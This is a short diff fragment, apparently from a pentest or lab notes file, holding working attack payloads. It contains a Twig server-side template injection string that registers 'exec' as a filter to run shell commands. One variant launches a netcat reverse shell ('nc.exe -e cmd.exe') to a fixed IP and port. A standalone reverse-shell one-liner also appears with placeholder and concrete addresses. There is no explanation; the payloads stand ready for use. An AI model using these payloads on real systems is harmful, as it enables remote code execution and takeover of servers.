@@ -23,8 +23,8 @@ if __name__ == '__main__':
 
   
 
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nc.exe -e cmd.exe 192.168.154.128 4242")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("uname -r")}}
         
-nc.exe -e cmd.exe <Attacker_IP> <PORT>        
+nc.exe -e cmd.exe 192.168.154.128 4242       
         
         
